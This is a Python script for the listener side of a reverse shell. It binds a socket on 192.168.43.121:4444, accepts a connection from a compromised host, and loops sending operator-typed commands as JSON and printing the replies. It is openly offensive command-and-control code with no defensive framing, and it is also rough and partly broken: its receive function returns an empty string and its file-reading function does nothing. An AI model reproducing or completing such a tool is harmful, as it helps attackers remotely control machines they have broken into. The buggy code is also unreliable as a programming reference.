import socket,json
from unittest import result


class listner:
    def __init__(self,ip,port) :
        lisnt=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        lisnt.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        lisnt.bind((ip,port))
        lisnt.listen(0)
        print("[+] IM LISTENNING")
        self.connection,self.ips=lisnt.accept()
        print("[âœ”] connected"+str(self.ips))
        self.rest=self.connection.recv(1024).decode()

    def jsonSend(self,data):
        jdatas=json.dumps(data)
        # print(type(jdatas))
        self.connection.send(jdatas.encode() )
    
    def jsonrsv(self,cmd):
       jdata=""
       self.outs=""
       while True:
            
             
            try:
                jdata=jdata+self.connection.recv(1024).decode()
                print(json.loads(jdata.encode()) )

            except Exception as e:
                print(self.outs)
                
                continue 
            break
            print("in loop")  
       return self.outs
            

        
    
    def exicute(self,cmd):
        self.dow=""      
        self.jsonSend(cmd)
        if cmd[0]=="exit":
            print("QUITTING..user interruption")
            self.connection.close()
            exit()
        return self.jsonrsv(cmd)


    def readf(self,path):
        with open(path,"rb"):    
                pass
    
    def runner(self):
        while True:
            cmd=input(str(self.ips[0]+" > "))
            cmd=cmd.split(" ")
            self.exicute(cmd)

                


listning=listner("192.168.43.121",4444)
listning.runner()